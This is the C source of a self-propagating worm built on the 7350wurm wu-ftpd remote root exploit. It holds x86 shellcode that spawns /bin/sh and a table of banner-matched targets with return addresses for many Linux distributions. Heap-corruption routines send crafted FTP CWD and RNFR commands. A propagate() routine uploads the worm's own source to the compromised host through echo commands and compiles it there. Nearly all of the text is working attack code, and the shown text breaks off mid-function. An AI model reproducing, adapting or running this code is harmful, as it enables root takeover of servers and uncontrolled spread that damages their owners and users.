#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/telnet.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>

#define MAX(x, y) (((x) > (y)) ? (x) : (y))
#define MIN(x, y) (((x) < (y)) ? (x) : (y))

typedef struct {
    char *                  desc;           /* distribution */
    char *                  banner;         /* ftp banner part */
    unsigned char *         shellcode;
    unsigned int            shellcode_len;

    unsigned long int       retloc;         /* return address location */
    unsigned long int       cbuf;           /* &cbuf[0] */
} target_t;

unsigned char shellcode[] = \
    "\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\xeb\x36\x5e\x88\x46\x0a"
    "\x8d\x5e\x05\xb1\xed\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd\x80\x83"
    "\xc3\x02\xb0\x0c\xcd\x80\xe0\xfa\xb0\x3d\xcd\x80\x89\x76\x08\x31"
    "\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x89\xc2\xb0\x0b"
    "\xcd\x80\xe8\xc5\xff\xff\xff/bin/sh..";

target_t * target_from_banner (unsigned char *banner);

int exploit (int fd, target_t *tgt, unsigned char *shellcode);

void xp_buildsize (int fd, unsigned char this_size_ls,
        unsigned long int csize);
void xp_gapfill (int fd, int rnfr_num, int rnfr_size);
int xp_build (target_t *tgt, unsigned char *buf, unsigned long int buf_len);
void xp_buildchunk (target_t *tgt, unsigned char *cspace, unsigned int clen);

void ftp_escape (unsigned char *buf, unsigned long int buflen);
void ftp_recv_until (int sock, char *buff, int len, char *begin);
int ftp_login (char *host, char *user, char *pass, char **banner);

unsigned long int net_resolve (char *host);
int net_connect (struct sockaddr_in *cs, char *server,
        unsigned short int port, int sec);
void net_write (int fd, const char *str, ...);
int net_rtimeout (int fd, int sec);
int net_rlinet (int fd, char *buf, int bufsize, int sec);

void propagate(int fd);
void upload_file(int fd, const char *filename, const char *dest);
void command(int fd, const char *str, ...);
int shell(int sock);

int main(int argc, char *argv[]) {
    int fd, ret;
    target_t *target = NULL;
    char *banner;
    unsigned int mlen = 0;
    unsigned char mcode[256];
    char *hostname;
    char *username = "ftp";
    char *password = "ftp";

    if (argc < 2) {
        fprintf(stderr, "Usage:\n\n\t%s TARGET_IP\n\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    hostname = argv[1];

    printf("#\n");
    printf("# FTP Exploit\n");
    printf("#\n");

    printf("# Connecting to %s with (%s/%s)...", hostname, username, password);
    fd = ftp_login(hostname, username, password, &banner);
    if (fd <= 0) {
        printf (" fail.\n");
        fprintf(stderr, "Failed to connect (user/pass correct?)\n");
        return -1;
    }
    printf(" connected.\n");

    printf("# Banner: %s\n", (banner == NULL) ? "???" : banner);
    if (target == NULL) {
        target = target_from_banner(banner);
        if (target == NULL) {
            printf ("# Failed to get target from banner, aborting...\n");
            return -1;
        }
    }
    printf ("# Target: %s\n", target->desc);

    printf ("# Running exploit...");
    ret = exploit (fd, target, shellcode);
    if (ret != 0) {
        printf (" fail.\n");
        printf("# Failed to run exploit against %s.", hostname);
        exit(EXIT_FAILURE);
    }
    printf (" success.\n");

    propagate(fd);

    // open a shell
    /*ret = shell(fd);
    if (ret != 0) {
        exit(EXIT_FAILURE);
    }*/

    close(fd);
    exit(EXIT_SUCCESS);
}

void propagate(int fd) {
    command(fd, "rm -f /tmp/worm.c");
    upload_file(fd, "./main.c", "/tmp/worm.c");
    command(fd, "gcc -o /tmp/worm /tmp/worm.c");
}

void upload_file(int fd, const char *filename, const char *dest) {
    FILE *file;
    int size;
    unsigned char *file_buf;
    unsigned char hex_string[256];
    unsigned char hex[8];
    int i, offset;

    file = fopen(filename, "rb");

    // get the size of the file
    fseek(file, 0, SEEK_END);
    size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // read the entire file into a buffer
    file_buf = (unsigned char*) malloc(size + 1);
    fread((void*) file_buf, size, 1, file);

    // log the operation
    printf("Pushing file '%s'", filename);
    fflush(stdout);

    // push the file 16 bytes at a time
    for (i=0; i<size; i+=16) {
        // empty hex_string
        hex_string[0] = 0;

        // write hexadecimal bytes to hex_string
        for (offset=0; offset<MIN(16, size-i); offset++) {
            sprintf(hex, "\\x%02x", file_buf[i+offset]);
            strcat(hex_string, hex);
        }

        // execute a command to echo the hexadecimal bytes to the dest file
        command(fd, "echo -n -e '%s' >> %s", hex_string, dest);

        // print progress
        printf(".");
        fflush(stdout);
    }

    free(file_buf);
    fclose(file);

    printf(" [done]\n");    
}

void command(int fd, const char *str, ...) {
    char cmd[1024], buf[1024];
    va_list vl;
    int size;

    strcpy(cmd, str);
    strcat(cmd, "; echo\n");

    va_start(vl, cmd);
    size = vsnprintf(buf, sizeof(buf), cmd, vl);
    va_end(vl);

    write(fd, buf, size);

    read(fd, buf, sizeof(buf));
}

int shell(int sock) {
    int l;
    char buf[512];
    fd_set  rfds;

    while (1) {
        FD_SET(0, &rfds);
        FD_SET(sock, &rfds);

        select(sock + 1, &rfds, NULL, NULL, NULL);
        if (FD_ISSET(0, &rfds)) {
            l = read(0, buf, sizeof (buf));
            if (l <= 0) {
                perror("read user");
                return -1;
            }
            write (sock, buf, l);
        }

        if (FD_ISSET(sock, &rfds)) {
            l = read(sock, buf, sizeof (buf));
            if (l == 0) {
                printf("connection closed by foreign host.\n");
                return -1;
            } else if (l < 0) {
                perror("read remote");
                return -1;
            }
            write (1, buf, l);
        }
    }

    return 0;
}


/* ================================================ *
 *                    EXPLOIT                       *
 * ================================================ *
 *
 * 7350wurm - x86/linux wu_ftpd remote root exploit
 *
 */

#define VERBOSITY 0
#define INIT_CMD "unset HISTFILE;id;uname -a;\n"

#define CHUNK_POS               256
#define MALLOC_ALIGN_MASK       0x07
#define MALLOC_MINSIZE          0x10
#define CHUNK_ALLSIZE(s) \
        CHUNK_ROUND((s)) + 0x08
#define CHUNK_ROUND(s) \
        (((((s) + 4 + MALLOC_ALIGN_MASK)) < \
                (MALLOC_MINSIZE + MALLOC_ALIGN_MASK)) ? \
        (MALLOC_MINSIZE) : ((((s) + 4 + MALLOC_ALIGN_MASK)) & \
        ~MALLOC_ALIGN_MASK))
/* minimum sized malloc(n) allocation that will jield in an overall
 * chunk size of s. (s must be a valid %8=0 chunksize)
 */
#define CHUNK_ROUNDDOWN(s) \
        ((s) <= 0x8) ? (1) : ((s) - 0x04 - 11)
#define CHUNK_STRROUNDDOWN(s) \
        (CHUNK_ROUNDDOWN ((s)) > 1 ? CHUNK_ROUNDDOWN ((s)) - 1 : 1)

#define ADDR_STORE(ptr,addr){\
        ((unsigned char *) (ptr))[0] = (addr) & 0xff;\
        ((unsigned char *) (ptr))[1] = ((addr) >> 8) & 0xff;\
        ((unsigned char *) (ptr))[2] = ((addr) >> 16) & 0xff;\
        ((unsigned char *) (ptr))[3] = ((addr) >> 24) & 0xff;\
}

#define NET_READTIMEOUT 20

/* exploitation related stuff, which is fixed on all wuftpd systems
 */
#define RNFR_SIZE       4
#define RNFR_NUM        73

/* x86/linux write/read/exec code (41 bytes)
 * does: 1. write (1, "\nsP\n", 4);
 *       2. read (0, ncode, 0xff);
 *       3. jmp ncode
 */
unsigned char   x86_wrx[] =
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x31\xdb\x43\xb8\x0b\x74\x51\x0b\x2d\x01\x01\x01"
        "\x01\x50\x89\xe1\x6a\x04\x58\x89\xc2\xcd\x80\xeb"
        "\x0e\x31\xdb\xf7\xe3\xfe\xca\x59\x6a\x03\x58\xcd"
        "\x80\xeb\x05\xe8\xed\xff\xff\xff";

target_t targets[] = {
        { "Caldera eDesktop|eServer|OpenLinux 2.3 update "
                "[wu-ftpd-2.6.1-13OL.i386.rpm]",
                "Version wu-2.6.1(1) Wed Nov 28 14:03:42 CET 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806e2b0, 0x080820a0 },

        { "Debian potato [wu-ftpd_2.6.0-3.deb]",
                "Version wu-2.6.0(1) Tue Nov 30 19:12:53 CET 1999",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806db00, 0x0807f520 },

        { "Debian potato [wu-ftpd_2.6.0-5.1.deb]",
                "Version wu-2.6.0(1) Fri Jun 23 08:07:11 CEST 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806db80, 0x0807f5a0 },

        { "Debian potato [wu-ftpd_2.6.0-5.3.deb]",
                "Version wu-2.6.0(1) Thu Feb 8 17:45:47 CET 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806db80, 0x0807f5a0 },

        { "Debian sid [wu-ftpd_2.6.1-5_i386.deb]",
                "Version wu-2.6.1(1) Sat Feb 24 01:43:53 GMT 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806e7a0, 0x0807ffe0 },

        { "Immunix 6.2 (Cartman) [wu-ftpd-2.6.0-3_StackGuard.rpm]",
                "Version wu-2.6.0(1) Thu May 25 03:35:34 PDT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x080713e0, 0x08082e00 },

        { "Immunix 7.0 (Stolichnaya) [wu-ftpd-2.6.1-6_imnx_2.rpm]",
                "Version wu-2.6.1(1) Mon Jan 29 08:04:31 PST 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x08072bd4, 0x08086400 },

        { "Mandrake 6.0|6.1|7.0|7.1 update [wu-ftpd-2.6.1-8.6mdk.i586.rpm]",
                "Version wu-2.6.1(1) Mon Jan 15 20:52:49 CET 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806f7f0, 0x08082600 },

        { "Mandrake 7.2 update [wu-ftpd-2.6.1-8.3mdk.i586.rpm]",
                "Version wu-2.6.1(1) Wed Jan 10 07:07:00 CET 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x08071850, 0x08084660 },

        { "Mandrake 8.1 [wu-ftpd-2.6.1-11mdk.i586.rpm]",
                "Version wu-2.6.1(1) Sun Sep 9 16:30:24 CEST 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806fec4, 0x08082b40 },

        { "RedHat 5.0|5.1 update [wu-ftpd-2.4.2b18-2.1.i386.rpm]",
                "Version wu-2.4.2-academ[BETA-18](1) "
                        "Mon Jan 18 19:19:31 EST 1999",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x08061cf0, 0x08068540 },       /* XXX: manually found */

        { "RedHat 5.2 (Apollo) [wu-ftpd-2.4.2b18-2.i386.rpm]",
                "Version wu-2.4.2-academ[BETA-18](1) "
                        "Mon Aug 3 19:17:20 EDT 1998",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x08061c48, 0x08068490 },       /* XXX: manually found */

        { "RedHat 5.2 update [wu-ftpd-2.6.0-2.5.x.i386.rpm]",
                "Version wu-2.6.0(1) Fri Jun 23 09:22:33 EDT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806b530, 0x08076550 },       /* XXX: manually found */

        { "RedHat 6.? [wu-ftpd-2.6.0-1.i386.rpm]",
                "Version wu-2.6.0(1) Thu Oct 21 12:27:00 EDT 1999",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806e620, 0x080803e0 },

        { "RedHat 6.0|6.1|6.2 update [wu-ftpd-2.6.0-14.6x.i386.rpm]",
                "Version wu-2.6.0(1) Fri Jun 23 09:17:44 EDT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x08070538, 0x08083360 },

        { "RedHat 6.1 (Cartman) [wu-ftpd-2.5.0-9.rpm]",
                "Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806cb88, 0x0807cc40 },

        { "RedHat 6.2 (Zoot) [wu-ftpd-2.6.0-3.i386.rpm]",
                "Version wu-2.6.0(1) Mon Feb 28 10:30:36 EST 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806e1a0, 0x0807fbc0 },

        { "RedHat 7.0 (Guinness) [wu-ftpd-2.6.1-6.i386.rpm]",
                "Version wu-2.6.1(1) Wed Aug 9 05:54:50 EDT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x08070ddc, 0x08084600 },

        { "RedHat 7.1 (Seawolf) [wu-ftpd-2.6.1-16.rpm]",
                "Version wu-2.6.1-16",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0807314c, 0x08085de0 },

        { "RedHat 7.2 (Enigma) [wu-ftpd-2.6.1-18.i386.rpm]",
                "Version wu-2.6.1-18",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x08072c30, 0x08085900 },

        { "SuSE 6.0|6.1 update [wuftpd-2.6.0-151.i386.rpm]",
                "Version wu-2.6.0(1) Wed Aug 30 22:26:16 GMT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806e6b4, 0x080800c0 },

        { "SuSE 6.0|6.1 update wu-2.4.2 [wuftpd-2.6.0-151.i386.rpm]",
                "Version wu-2.4.2-academ[BETA-18](1) "
                        "Wed Aug 30 22:26:37 GMT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806989c, 0x08069f80 },

        { "SuSE 6.2 update [wu-ftpd-2.6.0-1.i386.rpm]",
                "Version wu-2.6.0(1) Thu Oct 28 23:35:06 GMT 1999",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806f85c, 0x08081280 },

        { "SuSE 6.2 update [wuftpd-2.6.0-121.i386.rpm]",
                "Version wu-2.6.0(1) Mon Jun 26 13:11:34 GMT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806f4e0, 0x08080f00 },

        { "SuSE 6.2 update wu-2.4.2 [wuftpd-2.6.0-121.i386.rpm]",
                "Version wu-2.4.2-academ[BETA-18](1) "
                        "Mon Jun 26 13:11:56 GMT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806a234, 0x0806a880 },

        { "SuSE 7.0 [wuftpd.rpm]",
                "Version wu-2.6.0(1) Wed Sep 20 23:52:03 GMT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806f180, 0x08080ba0 },

        { "SuSE 7.0 wu-2.4.2 [wuftpd.rpm]",
                "Version wu-2.4.2-academ[BETA-18](1) "
                        "Wed Sep 20 23:52:21 GMT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806a554, 0x0806aba0 },

        { "SuSE 7.1 [wuftpd.rpm]",
                "Version wu-2.6.0(1) Thu Mar 1 14:43:47 GMT 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806f168, 0x08080980 },

        { "SuSE 7.1 wu-2.4.2 [wuftpd.rpm]",
                "Version wu-2.4.2-academ[BETA-18](1) "
                        "Thu Mar 1 14:44:08 GMT 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806a534, 0x0806ab80 },

        { "SuSE 7.2 [wuftpd.rpm]",
                "Version wu-2.6.0(1) Mon Jun 18 12:34:55 GMT 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806f58c, 0x08080dc0 },

        { "SuSE 7.2 wu-2.4.2 [wuftpd.rpm]",
                "Version wu-2.4.2-academ[BETA-18](1) "
                        "Mon Jun 18 12:35:12 GMT 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806a784, 0x0806ae40 },

        { "SuSE 7.3 [wuftpd.rpm]",
                "Version wu-2.6.0(1) Thu Oct 25 03:14:33 GMT 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806f31c, 0x08080aa0 },

        { "SuSE 7.3 wu-2.4.2 [wuftpd.rpm]",
                "Version wu-2.4.2-academ[BETA-18](1) "
                        "Thu Oct 25 03:14:49 GMT 2001",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806a764, 0x0806ad60 },

        { "Slackware 7.1",
                "Version wu-2.6.0(1) Tue Jun 27 10:52:28 PDT 2000",
                x86_wrx, sizeof (x86_wrx) - 1,
                0x0806ba2c, },

        { NULL, NULL, 0, 0, 0, 0 },
};

/* target_from_banner
 *
 * try to automatically select target from ftp banner
 *
 * return pointer to target structure on success
 * return NULL on failure
 */
target_t *target_from_banner (unsigned char *banner) {
    int tw; /* target list walker */

    for (tw = 0 ; targets[tw].desc != NULL ; ++tw) {
        if (strstr (banner, targets[tw].banner) != NULL)
            return (&targets[tw]);
    }

    return (NULL);
}

int exploit (int fd, target_t *tgt, unsigned char *shellcode) {
    unsigned long int dir_chunk_size;
    unsigned long int bridge_dist;
    unsigned long int padchunk_size;
    unsigned long int fakechunk_size;
    unsigned long int pad_before;
    unsigned char *dl; /* dirlength */
    unsigned char xpbuf[512 + 64];

    if (VERBOSITY >= 1)
        printf ("# 1. filling memory gaps\n");
    xp_gapfill (fd, RNFR_NUM, RNFR_SIZE);

    /* figure out home directory length
     */
    net_write (fd, "PWD\n");
    ftp_recv_until (fd, xpbuf, sizeof (xpbuf), "257 ");

    dl = strchr (xpbuf, '"');
    if (dl == NULL || strchr (dl + 1, '"') == NULL) {
        fprintf (stderr, "faulty PWD reply: %s\n", xpbuf);
        return -1;
    }

    dir_chunk_size = 0;
    for (dl += 1 ; *dl != '"' ; ++dl)
        dir_chunk_size += 1;

    if (VERBOSITY >= 2)
        printf ("PWD path (%lu): %s\n", dir_chunk_size, xpbuf);

    /* compute chunk size from it (needed later)
     */
    dir_chunk_size += 3;    /* ~/ + NUL byte */
    dir_chunk_size = CHUNK_ROUND (dir_chunk_size);

    /* send preparation buffer to store the fakechunk in the end of
     * the malloc buffer allocated from within the parser ($1)
     */
    if (VERBOSITY >= 1)
        printf ("# 2. sending bigbuf + fakechunk\n");
    xp_build (tgt, xpbuf, 500 - strlen ("LIST "));

    ftp_escape (xpbuf, sizeof (xpbuf));
    net_write (fd, "CWD %s\n", xpbuf);
    ftp_recv_until (fd, xpbuf, sizeof (xpbuf), "550 ");

    /* synnergy.net uberleet method (thank you very much guys !)
     */
    net_write (fd, "CWD ~/{.,.,.,.}\n");
    ftp_recv_until (fd, xpbuf, sizeof (xpbuf), "250 ");

    /* now, we flush the last-used-chunk marker in glibc malloc code. else
     * we might land in a previously used bigger chunk, but we need a
     * sequential order. "CWD ." will allocate a two byte chunk, which will
     * be reused on any later small malloc.
     */
    net_write (fd, "CWD .\n");
    ftp_recv_until (fd, xpbuf, sizeof (xpbuf), "250 ");

    /* cause chunk with padding size
     */
    pad_before = CHUNK_ALLSIZE (strlen ("~/{.,.,.,.}\n")) +
                    dir_chunk_size - 0x08;
    xp_gapfill (fd, 1, CHUNK_ROUNDDOWN (pad_before));

    /* 0x10 (CWD ~/{.,.,.,.}) + 4 * dirchunk */
    bridge_dist = 0x10 + 4 * dir_chunk_size;

    /* 0x18 (RNFR 16), dcs (RNFR dir), 0x10 (CWD ~{) */
    padchunk_size = bridge_dist - 0x18 - dir_chunk_size - 0x10;

    /* +4 = this_size field itself */
    fakechunk_size = CHUNK_POS + 4;
    fakechunk_size -= pad_before;
    fakechunk_size += 0x04; /* account for prev_size, too */
    fakechunk_size |= 0x1;  /* set PREV_INUSE */

    xp_buildsize (fd, fakechunk_size, 0x10);

    /* pad down to the minimum possible size in 8 byte alignment
     */
    if (VERBOSITY >= 2)
        printf ("\npadchunk_size = 0x%08lx\n==> %lu\n", padchunk_size, padchunk_size - 8 - 1);
    xp_gapfill (fd, 1, padchunk_size - 8 - 1);

    if (VERBOSITY >= 1)
        printf ("# 3. triggering free(globlist[1])\n");
    net_write (fd, "CWD ~{\n");

    ftp_recv_until (fd, xpbuf, sizeof (xpbuf), "sP");
    if (strncmp (xpbuf, "sP", 2) != 0) {
        fprintf (stderr, "exploitation FAILED !\noutput:\n%s\n", xpbuf);
        return -1;
    }

    if (VERBOSITY >= 1)
        printf ("#\n# exploitation succeeded. sending real shellcode\n");

    if (VERBOSITY >= 1)
        printf ("# sending shellcode\n");
    sleep(1);
    net_write (fd, "%s", shellcode);

    //write (fd, INIT_CMD, strlen (INIT_CMD));

    return 0;
}

/* xp_buildsize
 *
 * set chunksize to this_size_ls. do this in a csize bytes long chunk.
 * normally csize = 0x10. csize is always a padded chunksize.
 */
void xp_buildsize (int fd, unsigned char this_size_ls, unsigned long int csize) {
    int             n,
                    cw;     /* chunk walker */
    unsigned char   tmpbuf[512];
    unsigned char * leet = "7350";


    for (n = 2 ; n > 0 ; --n) {
        memset (tmpbuf, '\0', sizeof (tmpbuf));

        for (cw = 0 ; cw < (csize - 0x08) ; ++cw)
            tmpbuf[cw] = leet[cw % 4];

        tmpbuf[cw - 4 + n] = '\0';  

        net_write (fd, "CWD %s\n", tmpbuf);
        ftp_recv_until (fd, tmpbuf, sizeof (tmpbuf), "550 ");
    }

    memset (tmpbuf, '\0', sizeof (tmpbuf));
    for (cw = 0 ; cw < (csize - 0x08 - 0x04) ; ++cw)
        tmpbuf[cw] = leet[cw % 4];

    net_write (fd, "CWD %s%c\n", tmpbuf, this_size_ls);
    ftp_recv_until (fd, tmpbuf, sizeof (tmpbuf), "550 ");

    /* send a minimum-sized malloc request that will allocate a chunk
     * with 'csize' overall bytes
     */
    xp_gapfill (fd, 1, CHUNK_STRROUNDDOWN (csize));
}

/* xp_gapfill
 *
 * fill all small memory gaps in wuftpd malloc space. do this by sending
 * rnfr requests which cause a memleak in wuftpd.
 *
 * return in any case
 */
void xp_gapfill (int fd, int rnfr_num, int rnfr_size) {
    int             n;
    unsigned char * rb;             /* rnfr buffer */
    unsigned char * rbw;            /* rnfr buffer walker */
    unsigned char   rcv_buf[512];   /* temporary receive buffer */

    rbw = rb = calloc (1, rnfr_size + 6);
    strcpy (rbw, "RNFR ");
    rbw += strlen (rbw);

    /* append a string of "././././". since wuftpd only checks whether
     * the pathname is lstat'able, it will go through without any problems
     */
    for (n = 0 ; n < rnfr_size ; ++n)
        strcat (rbw, ((n % 2) == 0) ? "." : "/");
    strcat (rbw, "\n");

    for (n = 0 ; n < rnfr_num; ++n) {
        net_write (fd, "%s", rb);
        ftp_recv_until (fd, rcv_buf, sizeof (rcv_buf), "350 ");
    }
    free (rb);
}


int xp_build (target_t *tgt, unsigned char *buf, unsigned long int buf_len) {
    unsigned char * wl;

    memset (buf, '\0', buf_len);

    memset (buf, '0', CHUNK_POS);
    xp_buildchunk (tgt, buf + CHUNK_POS, buf_len - CHUNK_POS - 1);

    for (wl = buf + strlen (buf) ; wl < &buf[buf_len - 1] ; wl += 2) {
        wl[0] = '\xeb';
        wl[1] = '\x0c';
    }

    memcpy (&buf[buf_len - 1] - tgt->shellcode_len, tgt->shellcode,
        tgt->shellcode_len);

    return (strlen (buf));
}

/* xp_buildchunk
 *
 * build the fake malloc chunk that will overwrite retloc with retaddr
 */
void xp_buildchunk (target_t *tgt, unsigned char *cspace, unsigned int clen) {
    unsigned long int       retaddr_eff;    /* effective */

    retaddr_eff = tgt->cbuf + 512 - tgt->shellcode_len - 16;

    if (VERBOSITY >= 2)
        fprintf (stderr, "\tbuilding chunk: ([0x%08lx] = 0x%08lx) in %d bytes\n",
            tgt->retloc, retaddr_eff, clen);

    /* easy, straight forward technique
     */
    ADDR_STORE (&cspace[0], 0xfffffff0);            /* prev_size */
    ADDR_STORE (&cspace[4], 0xfffffffc);            /* this_size */
    ADDR_STORE (&cspace[8], tgt->retloc - 12);      /* fd */
    ADDR_STORE (&cspace[12], retaddr_eff);          /* bk */
}

void ftp_escape (unsigned char *buf, unsigned long int buflen) {
    unsigned char * obuf = buf;


    for ( ; *buf != '\0' ; ++buf) {
        if (*buf == 0xff &&
            (((buf - obuf) + strlen (buf) + 1) < buflen))
        {
            memmove (buf + 1, buf, strlen (buf) + 1);
            buf += 1;
        }
    }
}


void ftp_recv_until (int sock, char *buff, int len, char *begin) {
    char    dbuff[2048];

    if (buff == NULL) {
        buff = dbuff;
        len = sizeof (dbuff);
    }

    do {
        memset (buff, '\x00', len);
        if (net_rlinet (sock, buff, len - 1, 20) <= 0)
            return;
    } while (memcmp (buff, begin, strlen (begin)) != 0);

    return;
}

int ftp_login (char *host, char *user, char *pass, char **banner) {
    int     ftpsock;
    char    resp[512];

    ftpsock = net_connect (NULL, host, 21, 30);
    if (ftpsock <= 0)
        return (0);

    memset (resp, '\x00', sizeof (resp));
    if (net_rlinet (ftpsock, resp, sizeof (resp) - 1, 20) <= 0)
        goto flerr;

    /* handle multiline pre-login stuff (rfc violation !)
     */
    if (memcmp (resp, "220-", 4) == 0)
        ftp_recv_until (ftpsock, resp, sizeof (resp), "220 ");

    if (memcmp (resp, "220 ", 4) != 0) {
#ifdef DEBUG
        printf ("\n%s\n", resp);
#endif
        goto flerr;
    }
    (*banner) = strdup (resp);
    (*banner)[strcspn((*banner), "\n")] = 0;

    net_write (ftpsock, "USER %s\n", user);
    memset (resp, '\x00', sizeof (resp));
    if (net_rlinet (ftpsock, resp, sizeof (resp) - 1, 20) <= 0)
        goto flerr;

    if (memcmp (resp, "331 ", 4) != 0) {
#ifdef DEBUG
        printf ("\n%s\n", resp);
#endif
        goto flerr;
    }

    net_write (ftpsock, "PASS %s\n", pass);
    memset (resp, '\x00', sizeof (resp));
    if (net_rlinet (ftpsock, resp, sizeof (resp) - 1, 20) <= 0)
        goto flerr;


    /* handle multiline responses from ftp servers
     */
    if (memcmp (resp, "230-", 4) == 0)
        ftp_recv_until (ftpsock, resp, sizeof (resp), "230 ");

    if (memcmp (resp, "230 ", 4) != 0) {
#ifdef DEBUG
        printf ("\n%s\n", resp);
#endif
        goto flerr;
    }

    return (ftpsock);

flerr:
    if (ftpsock > 0)
        close (ftpsock);

    return (0);
}

unsigned long int net_resolve (char *host) {
    long            i;
    struct hostent  *he;

    i = inet_addr(host);
    if (i == -1) {
        he = gethostbyname(host);
        if (he == NULL) {
            return (0);
        } else {
            return (*(unsigned long *) he->h_addr);
        }
    }
    return (i);
}

int net_connect (struct sockaddr_in *cs, char *server, unsigned short int port, int sec) {
    int                     n,
                            len,
                            error,
                            flags;
    int                     fd;
    struct timeval          tv;
    fd_set                  rset, wset;
    struct sockaddr_in      csa;

    if (cs == NULL)
        cs = &csa;

    /* first allocate a socket */
    cs->sin_family = AF_INET;
    cs->sin_port = htons (port);
    fd = socket (cs->sin_family, SOCK_STREAM, 0);
    if (fd == -1)
        return (-1);

    if (!(cs->sin_addr.s_addr = net_resolve (server))) {
        close (fd);
        return (-1);
    }

    flags = fcntl (fd, F_GETFL, 0);
    if (flags == -1) {
        close (fd);
        return (-1);
    }
    n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
    if (n == -1) {
        close (fd);
        return (-1);
    }

    error = 0;

    n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
    if (n < 0) {
        if (errno != EINPROGRESS) {
            close (fd);
            return (-1);
        }
    }
    if (n == 0)
        goto done;

    FD_ZERO(&rset);
    FD_ZERO(&wset);
    FD_SET(fd, &rset);
    FD_SET(fd, &wset);
    tv.tv_sec = sec;
    tv.tv_usec = 0;

    n = select(fd + 1, &rset, &wset, NULL, &tv);
    if (n == 0) {
        close(fd);
        errno = ETIMEDOUT;
        return (-1);
    }
    if (n == -1)
        return (-1);

    if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {
        if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {
            len = sizeof(error);
            if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
                errno = ETIMEDOUT;
                return (-1);
            }
            if (error == 0) {
                goto done;
            } else {
                errno = error;
                return (-1);
            }
        }
    }
    else
        return (-1);

done:
    n = fcntl(fd, F_SETFL, flags);
    if (n == -1)
        return (-1);
    return (fd);
}

void net_write (int fd, const char *str, ...) {
    char    tmp[1025];
    va_list vl;
    int     i;

    va_start(vl, str);
    memset(tmp, 0, sizeof(tmp));
    i = vsnprintf(tmp, sizeof(tmp), str, vl);
    va_end(vl);

#ifdef DEBUG
    printf ("[snd] %s%s", tmp, (tmp[strlen (tmp) - 1] == '\n') ? "" : "\n");
#endif

    send(fd, tmp, i, 0);
    return;
}

int net_rlinet (int fd, char *buf, int bufsize, int sec) {
    int                     n;
    unsigned long int       rb = 0;
    struct timeval          tv_start, tv_cur;

    memset(buf, '\0', bufsize);
    (void) gettimeofday(&tv_start, NULL);

    do {
        (void) gettimeofday(&tv_cur, NULL);
        if (sec > 0) {
            if ((((tv_cur.tv_sec * 1000000) + (tv_cur.tv_usec)) -
                ((tv_start.tv_sec * 1000000) +
                (tv_start.tv_usec))) > (sec * 1000000))
            {
                return (-1);
            }
        }
        n = net_rtimeout(fd, NET_READTIMEOUT);
        if (n <= 0) {
            return (-1);
        }
        n = read(fd, buf, 1);
        if (n <= 0) {
            return (n);
        }
        rb++;
        if (*buf == '\n')
            return (rb);
        buf++;
        if (rb >= bufsize)
            return (-2);    /* buffer full */
    } while (1);
}

int net_rtimeout (int fd, int sec) {
    fd_set          rset;
    struct timeval  tv;
    int             n, error, flags;

    error = 0;
    flags = fcntl(fd, F_GETFL, 0);
    n = fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    if (n == -1)
        return (-1);

    FD_ZERO(&rset);
    FD_SET(fd, &rset);
    tv.tv_sec = sec;
    tv.tv_usec = 0;

    /* now we wait until more data is received then the tcp low level
     * watermark, which should be setted to 1 in this case (1 is default)
     */
    n = select(fd + 1, &rset, NULL, NULL, &tv);
    if (n == 0) {
        n = fcntl(fd, F_SETFL, flags);
        if (n == -1)
            return (-1);
        errno = ETIMEDOUT;
        return (-1);
    }
    if (n == -1) {
        return (-1);
    }
    /* socket readable ? */
    if (FD_ISSET(fd, &rset)) {
        n = fcntl(fd, F_SETFL, flags);
        if (n == -1)
            return (-1);
        return (1);
